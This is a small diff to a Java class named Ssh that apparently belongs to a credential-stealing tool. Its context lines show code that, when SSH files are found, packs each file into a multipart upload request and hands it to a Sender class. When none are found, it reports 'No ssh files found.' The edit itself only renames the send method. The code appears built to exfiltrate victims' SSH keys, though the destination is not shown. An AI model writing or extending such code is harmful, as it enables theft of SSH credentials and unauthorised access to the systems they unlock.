@@ -24,12 +24,11 @@ public class Ssh {
                             .addFormDataPart("file", file.getName(), RequestBody.create(MediaType.parse("application/octet-stream"), file))
                             .build();
 
-                    Sender.Sender(client, requestBody);
+                    Sender.sendFile(client, requestBody);
                 }
             }
         }else {
             Sender.sendMessage("No ssh files found.");
-
         }
     }
 }
